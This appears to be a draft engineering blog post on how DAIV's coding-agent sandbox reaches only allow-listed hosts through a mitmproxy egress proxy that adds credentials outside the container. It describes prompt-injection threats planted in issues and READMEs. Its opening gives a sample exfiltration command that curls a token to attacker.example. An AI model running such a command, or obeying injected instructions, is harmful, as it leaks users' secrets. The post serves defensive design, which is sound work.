---
title: "Giving a coding agent network access without giving it your secrets"
date: 2026-12-08
summary: "A coding agent's sandbox reaches only the hosts you list, through a proxy that adds credentials on the way out, so the agent never holds them."
author: Sandro Rodrigues
image: egress-policy.png
draft: true
---

An agent that fixes a failing CI job has to run `pip install` or `npm ci`, so its sandbox needs the network. If that sandbox also holds a registry token, one prompt-injected command such as `curl -d "$TOKEN" https://attacker.example` sends the token anywhere. Below is a setup that avoids it, with the code and its limits: the sandbox has no route out except a proxy of its own, the proxy lets through only the hosts you list, and it adds credentials to requests on their way out, so they never exist inside the container.

It is how DAIV, an open-source coding agent for GitLab and GitHub that you host yourself, runs the agent's commands and its own `git push` in a Docker sandbox.

When that sandbox tries to reach a host you did not list, the request gets a 403 and the proxy logs one line:

```text
egress: blocked CONNECT attacker.example — reason=host-not-listed (no rule matched; default=deny)
```

The list itself is a form on each sandbox environment. This one allows the Python and container registries read-only, and adds an `Authorization` header for a private registry:

![The sandbox environment form in DAIV with Network on, unlisted hosts denied, and four allowed hosts: pypi.org, files.pythonhosted.org and ghcr.io read-only, and registry.acme.internal read-only with an Authorization credential.](egress-policy.png)

## The threat: what the agent can read, it can send

A coding agent reads text that other people wrote: issue descriptions, review comments, READMEs, the source of a dependency it installed. Any of it can carry instructions. If a credential sits in an environment variable or a config file in the sandbox, every command the agent runs can read it, and an open network lets the command post it anywhere.

So the design goal is narrower than "isolate the agent". The agent should be able to use a credential without ever being able to read it, and reach the hosts its work needs and no others.

![A diagram: the sandbox container connects over an internal network with no gateway to a per-session egress proxy. The proxy checks whether the host is listed, whether the method is allowed, and adds the host's credential, denying on any error. pypi.org is allowed read-only, registry.acme.internal is allowed with an Authorization header added, and attacker.example is not listed and gets a 403.](egress-flow.svg)

## No route out except the proxy

The network isolation lives in [daiv-sandbox](https://github.com/srtab/daiv-sandbox), the service that runs DAIV's containers. A sandbox with no egress policy gets Docker's `network_mode="none"` ([main.py](https://github.com/srtab/daiv-sandbox/blob/v0.6.0/daiv_sandbox/main.py#L273-L274)). A sandbox with one gets three resources of its own: a container, a proxy container beside it, and a Docker network that joins them, plus the session's headless browser when it has one, and nothing else:

```python
def create_network(self, token: str) -> str:
    name = self.internal_network_name(token)
    self.client.networks.create(
        name=name,
        driver="bridge",
        internal=True,  # no gateway: the sandbox's only route out is the proxy
        labels={DAIV_SANDBOX_TYPE_LABEL: TYPE_EGRESS_NETWORK, EGRESS_SESSION_LABEL: token},
    )
    return name
```

([manager.py](https://github.com/srtab/daiv-sandbox/blob/v0.6.0/daiv_sandbox/egress/manager.py#L83-L91))

An `internal` Docker network has no gateway, so the sandbox has no route to the internet. Only the proxy has a second network interface that reaches the outside ([manager.py](https://github.com/srtab/daiv-sandbox/blob/v0.6.0/daiv_sandbox/egress/manager.py#L127-L128)).

The sandbox gets `HTTP_PROXY`, `HTTPS_PROXY` and the CA bundle variables that pip, npm, git, curl and requests read ([manager.py](https://github.com/srtab/daiv-sandbox/blob/v0.6.0/daiv_sandbox/egress/manager.py#L49-L66)). Those variables are a convenience for well-behaved tools. The enforcement is the network: a process that ignores them has nowhere to go.

There is no option to attach a sandbox to an open network. If the deployment has no CA configured for the proxy, a request for network access is refused rather than given a network without a policy ([main.py](https://github.com/srtab/daiv-sandbox/blob/v0.6.0/daiv_sandbox/main.py#L276-L283)).

## Every request is checked twice

The proxy is [mitmproxy](https://mitmproxy.org/) 12.1.2 ([Dockerfile](https://github.com/srtab/daiv-sandbox/blob/v0.6.0/egress_proxy/Dockerfile#L3)) with an addon of about 200 lines ([addon.py](https://github.com/srtab/daiv-sandbox/blob/v0.6.0/daiv_sandbox/egress/addon.py)). It checks each connection at two points.

1. **At `CONNECT`**, before any TLS, it checks only that the host matches a rule ([addon.py](https://github.com/srtab/daiv-sandbox/blob/v0.6.0/daiv_sandbox/egress/addon.py#L119-L135)). With unlisted hosts denied, an unlisted host never gets a tunnel.
2. **On each request**, after it has decrypted the TLS, it checks the host, the method and the path against the rules ([addon.py](https://github.com/srtab/daiv-sandbox/blob/v0.6.0/daiv_sandbox/egress/addon.py#L161-L193)).

The second check needs the proxy to see inside HTTPS, so the sandbox trusts the proxy's CA certificate. DAIV always intercepts the TLS of every reachable host, and an environment cannot turn that off ([docs](https://github.com/srtab/daiv/blob/baf6f6d2367adb9dd100a3686ecfe1a51cb0d6c5/docs/features/sandbox-environments.md#L120)).

A rule is a host glob such as `*.githubusercontent.com`, the methods it allows, and optionally a credential. (DAIV's own git rules can also limit a rule to a path prefix; the environment form does not offer that.) The form's **Read-only** choice allows `GET`, `HEAD` and `OPTIONS`. A host that matches a rule but uses a method the rule does not allow is denied, even when unlisted hosts are allowed. Without that, a per-host method limit would do nothing under an allow-by-default policy ([policy.py](https://github.com/srtab/daiv-sandbox/blob/v0.6.0/daiv_sandbox/egress/policy.py#L186-L193)).

## Credentials are added on the way out

DAIV stores an environment's credential values encrypted with Fernet, and never sends them back to the browser or in an API response. At run time it hands them to the proxy, which keeps them in a file in its own container, with mode `0600`. The sandbox never receives them. When a request to a credentialed host passes the checks, the proxy sets the header itself:

```python
def requestheaders(self, flow) -> None:
    ...
    # `host` is where the connection goes (the CONNECT target inside a tunnel); `pretty_host` is the
    # client-controlled Host header, so judging by it would hand one host's secret to another.
    host = flow.request.host
    ...
    if decision.inject is not None:
        name, value = decision.inject
        if name in flow.request.headers:
            del flow.request.headers[name]
        ...
        flow.request.headers[name] = value
        logger.info("egress: injected %s for %s", name, host)
```

([addon.py](https://github.com/srtab/daiv-sandbox/blob/v0.6.0/daiv_sandbox/egress/addon.py#L161-L193), trimmed)

Three details in that function each close a way around it:

- **The host is the connection's destination, not the `Host` header.** The sandbox controls the `Host` header. If the two disagree on a request that would carry a credential, the proxy denies it.
- **Any header of the same name is removed first**, so the request carries the stored value, never one the sandbox chose.
- **The log names the header, never its value.** The policy summary the proxy logs gives only counts of rules and secrets.

The sandbox can also run a headless browser, which the same proxy serves. A page from another site can make that browser send requests to a credentialed host. So the proxy does not add the credential when the request's `Sec-Fetch-Site` or `Origin` header says another origin's page may have sent it ([addon.py](https://github.com/srtab/daiv-sandbox/blob/v0.6.0/daiv_sandbox/egress/addon.py#L89-L103)).

Header names must be valid HTTP tokens, and values cannot contain CR, LF or NUL. A value with a line break would otherwise smuggle a second header into requests to that host ([schemas.py](https://github.com/srtab/daiv-sandbox/blob/v0.6.0/daiv_sandbox/schemas.py#L342-L360)).

## Failing closed inside a proxy that fails open

When an addon hook raises an exception, mitmproxy logs it and lets the request through. For a security boundary, that is the wrong default, so every path in the addon has to deny before anything else can go wrong:

```python
def _deny(flow, log_prefix: str, block) -> None:
    """Deny a flow fail-closed: commit the 403 BEFORE formatting the reason. mitmproxy fails OPEN on an
    un-denied hook, so _forbidden must run before any code (reason formatting) that could conceivably
    raise. ..."""
    _forbidden(flow)
    logger.warning("egress: blocked %s — %s", log_prefix, _describe_block(block))
```

([addon.py](https://github.com/srtab/daiv-sandbox/blob/v0.6.0/daiv_sandbox/egress/addon.py#L70-L76))

The same rule runs through the rest of the proxy:

| Failure | Result |
|---|---|
| A hook raises while checking `CONNECT` or a request | Denied: a 403, or the connection dropped for a streamed body |
| The TLS ClientHello has no usable server name | Intercepted and checked, never tunnelled blindly |
| The policy file is missing, unreadable or invalid | Deny-all |
| A rule names a credential that does not exist | Whole policy rejected: deny-all |
| An unknown `default` or `intercept` value | Treated as `deny` and `all` |
| The CA cannot be copied into the proxy before it starts | Session start aborted |

The sources are [addon.py](https://github.com/srtab/daiv-sandbox/blob/v0.6.0/daiv_sandbox/egress/addon.py#L119-L177), [addon.py](https://github.com/srtab/daiv-sandbox/blob/v0.6.0/daiv_sandbox/egress/addon.py#L40-L49), [policy.py](https://github.com/srtab/daiv-sandbox/blob/v0.6.0/daiv_sandbox/egress/policy.py#L114-L158), [policy.py](https://github.com/srtab/daiv-sandbox/blob/v0.6.0/daiv_sandbox/egress/policy.py#L228-L262) and [manager.py](https://github.com/srtab/daiv-sandbox/blob/v0.6.0/daiv_sandbox/egress/manager.py#L136-L140).

Two less obvious cases:

- **Python versions.** The policy module is copied into the mitmproxy image, which runs Python 3.13, while the rest of daiv-sandbox targets 3.14. A 3.14-only syntax would make the addon fail to import, and an addon that does not load enforces nothing. The module's docstring says so, so the next person to touch it sees the trap ([policy.py](https://github.com/srtab/daiv-sandbox/blob/v0.6.0/daiv_sandbox/egress/policy.py#L1-L6)).
- **Half-written policies.** DAIV refreshes a running session's policy, for example to swap in a newly minted git token. A reader that caught a half-written file would fall back to deny-all until the next change. So the new policy is written to a temporary file, renamed over the old one, and given an explicit modification time, because a recycled inode and an unchanged size could otherwise make the change invisible to the proxy's reload check ([manager.py](https://github.com/srtab/daiv-sandbox/blob/v0.6.0/daiv_sandbox/egress/manager.py#L202-L249)).

## The git platform is one more rule

DAIV pushes from inside the sandbox too. When a run holds a push token, DAIV adds a rule for the repository's git host in front of the environment's own rules, carrying that token ([egress.py](https://github.com/srtab/daiv/blob/baf6f6d2367adb9dd100a3686ecfe1a51cb0d6c5/daiv/core/sandbox/egress.py#L1-L8)). It does this even when the environment has the network off, so the run can still publish its branch ([docs](https://github.com/srtab/daiv/blob/baf6f6d2367adb9dd100a3686ecfe1a51cb0d6c5/docs/features/sandbox-environments.md#L101)).

With several repositories in one session, each one's traffic carries its own token through a path-scoped rule. How the token is minted and scoped is the subject of [the companion post on keeping the GitLab token out of the sandbox](/blog/gitlab-token-out-of-agent-sandbox/).

## What it costs

- **One more container and one more network per session.** Docker's default address pools give about 31 bridge subnets per host, two of them taken permanently. If every stopped session kept its network, they would cap concurrency near 29, so a session's network is removed when it stops and recreated when it resumes ([manager.py](https://github.com/srtab/daiv-sandbox/blob/v0.6.0/daiv_sandbox/egress/manager.py#L263-L287)).
- **A CA to manage.** The deployment provides a CA certificate and key. Every sandbox trusts the certificate, and each proxy holds the key.
- **Memory.** By default mitmproxy buffers whole bodies. With git packfiles and parallel wheel downloads, that is 400 MB or more that the proxy never gives back, so it streams any body over 256 KB instead ([Dockerfile](https://github.com/srtab/daiv-sandbox/blob/v0.6.0/egress_proxy/Dockerfile#L16-L22)).

## What this does not protect against

- **Use, as opposed to theft.** The agent cannot read a credential, but anything running in the sandbox can send requests that the proxy will authenticate. For the git host, the code says it plainly: "anything running in the sandbox can send authenticated requests to that host" ([GitHub client](https://github.com/srtab/daiv/blob/baf6f6d2367adb9dd100a3686ecfe1a51cb0d6c5/daiv/codebase/clients/github/client.py#L357-L368)). The limit is the credential's own scope. The git tokens reach one repository, but within it they can push: on GitLab to any branch that is not protected, and on GitHub to workflow files too when the GitHub App grants `workflows: write`. A registry credential you add is only as narrow as the token you create for it.
- **Data leaving through an allowed host.** The proxy decides where requests may go, not what they contain. A read-only rule stops uploads by method, but a `GET` can still carry data in its URL. My reading is that the allow-list should hold only hosts you would accept that from.
- **An allow-by-default policy.** An environment can set unlisted hosts to **Allow**. The proxy still adds credentials and enforces method limits, but nothing stops traffic to other hosts.
- **The GitLab fallback.** Whenever GitLab won't mint a project token, DAIV falls back to the configured personal access token, and that is what the proxy adds for the git host. That covers a DAIV user below Maintainer, a plan without project access tokens such as GitLab.com Free, and any failed mint, for 5 minutes after a transient error and an hour after any other ([GitLab client](https://github.com/srtab/daiv/blob/baf6f6d2367adb9dd100a3686ecfe1a51cb0d6c5/daiv/codebase/clients/gitlab/client.py#L529-L558)). It still never enters the sandbox, but it can do far more than push to one project.
- **The container boundary.** Sandboxes run under Docker's default `runc` runtime unless the operator selects gVisor (`runsc`). A container escape is outside what the proxy can help with.

## Trying it

The proxy is part of [daiv-sandbox](https://github.com/srtab/daiv-sandbox), which DAIV's Docker Compose setup runs. The [sandbox environments page](https://docs.daivagent.com/latest/features/sandbox-environments/#network-access-and-egress-policy) of the docs covers the allow-list and credentials, and the [deployment reference](https://docs.daivagent.com/latest/reference/env-variables/#deployment-files) covers the CA files the proxy needs.
